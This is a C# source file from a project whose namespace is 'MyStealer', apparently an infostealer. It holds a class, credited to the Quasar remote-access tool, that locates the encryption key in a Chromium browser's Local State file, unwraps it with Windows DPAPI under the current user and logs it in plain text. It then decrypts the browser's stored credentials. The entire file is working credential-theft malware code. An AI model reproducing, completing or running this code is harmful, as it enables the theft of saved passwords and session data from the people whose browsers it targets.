using System.Diagnostics;
using System.IO;
using System;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using Serilog;

namespace MyStealer.Worker
{
    internal partial class Chromium
    {
        /// <summary>
        /// Provides methods to decrypt Chromium credentials.
        /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/ChromiumDecryptor.cs
        /// </summary>
        public class ChromiumDecryptor
        {
            private readonly byte[] _key;

            public ChromiumDecryptor(string localStatePath)
            {
                try
                {
                    if (File.Exists(localStatePath))
                    {
                        string localState = File.ReadAllText(localStatePath);

                        var subStr = localState.IndexOf("encrypted_key") + "encrypted_key".Length + 3;

                        var encKeyStr = localState.Substring(subStr).Substring(0, localState.Substring(subStr).IndexOf('"'));

                        Log.Information("[Chromium Decryptor] Protected key is {key}", encKeyStr);
                        _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
                            DataProtectionScope.CurrentUser);

                        Log.Information("[Chromium Decryptor] Unprotected key is {key}", Convert.ToBase64String(_key));
                    }
                }
                catch (Exception e)
                {
                    Log.Error(e, "[Chromium Decryptor] Error reading and unprotecting encryption key");
                }
            }

            public string Decrypt(string cipherText)
            {
                var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
                if (cipherText.StartsWith("v10") && _key != null)
                    return Encoding.UTF8.GetString(DecryptAesGcm(cipherTextBytes, _key, 3));
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
            }

            private byte[] DecryptAesGcm(byte[] message, byte[] key, int nonSecretPayloadLength)
            {
                const int KEY_BIT_SIZE = 256;
                const int MAC_BIT_SIZE = 128;
                const int NONCE_BIT_SIZE = 96;

                if (key == null || key.Length != KEY_BIT_SIZE / 8)
                    throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
                if (message == null || message.Length == 0)
                    throw new ArgumentException("Message required!", nameof(message));

                using (var cipherStream = new MemoryStream(message))
                using (var cipherReader = new BinaryReader(cipherStream))
                {
                    _ = cipherReader.ReadBytes(nonSecretPayloadLength);
                    var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                    var cipherText = cipherReader.ReadBytes(message.Length);
                    return AesGcm.GcmDecrypt(cipherText, key, nonce, new byte[0]);
                }
            }
        }
    }
}
